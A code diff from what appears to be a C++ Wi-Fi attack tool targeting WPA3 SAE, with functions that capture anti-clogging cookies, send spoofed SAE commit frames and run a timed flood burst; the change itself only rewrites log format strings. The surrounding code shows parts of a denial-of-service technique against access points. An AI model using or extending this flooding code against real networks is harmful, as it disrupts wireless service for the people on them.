@@ -72,8 +72,7 @@ void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, Cook
                 const auto [it, inserted] = store.queue.insert_or_assign(
                     entry->sta_mac.to_string(), *entry);
                 if(inserted){
-                    log(LogLevel::DEBUG, "Cookie captured for %s, queue size %d",
-                        entry->sta_mac.to_string().c_str(), store.queue.size());
+                    log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}", entry->sta_mac.to_string(), store.queue.size());
                 }
             }
         }
@@ -105,7 +104,7 @@ pair<ACMCookie,int> trigger_acm(const string &iface, const string &att_mac,
     if(fd == -1) throw runtime_error("pcap fd not selectable");
     pollfd pfd = {.fd = fd, .events = POLLIN, .revents = 0};
 
-    log(LogLevel::INFO, "Triggering ACM (max %d frames)...", trigger_count);
+    log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);
     for(int i = 0; i < trigger_count; ++i){
         auto frame = make_sae_commit(ap_mac, HWAddress < 6 > (firmware::get_random_ath_masker_mac(att_mac)),
                                      sae_params);
@@ -145,7 +144,7 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
     long long next_log = 0;
     const auto end_time = steady_clock::now() + seconds(attack_time_sec);
 
-    log(LogLevel::INFO, "Burst phase started, duration: %ds", attack_time_sec);
+    log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
 
     while(steady_clock::now() < end_time){
         ACMCookie entry;
@@ -181,13 +180,13 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
                 lock_guard l(store.mtx);
                 q_size = store.queue.size();
             }
-            log(LogLevel::DEBUG, "Sent: %zu, cookies remaining: %d", sent, q_size);
+            log(LogLevel::DEBUG, "Sent: {}, cookies remaining: {}", sent, q_size);
             next_log += 500;
         }
     }
 
     store.stop.store(true); // signal capture thread to exit
-    log(LogLevel::INFO, "Burst done. Total packets sent: %d", sent);
+    log(LogLevel::INFO, "Burst done. Total packets sent: {}", sent);
 }
 
 void run_attack(RunStatus &rs){
